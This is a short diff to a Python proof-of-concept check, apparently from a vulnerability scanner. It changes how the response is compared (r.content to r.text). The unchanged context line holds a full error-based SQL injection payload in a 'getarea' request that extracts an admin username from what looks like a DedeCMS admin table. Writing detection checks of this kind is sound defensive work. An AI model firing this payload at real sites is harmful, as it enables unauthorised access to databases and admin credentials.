@@ -55,7 +55,7 @@ class Poc(ABPoc):
             data = "?action=getarea&level=1%20%20or%20@`\’`=1%20and%20(SELECT%201%20FROM%20(select%20count(*),concat(floor(rand(0)*2),0x7e,(substring((Select%20concat(username,0x7e,md5(c))%20from%20`%23@__admin`),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%20and%20@`\’`=0%23"
             url = self.target + payload + data
             r = requests.get(url)
-            if '4a8a08f09d37b73795649038408b5f33' in r.content:
+            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
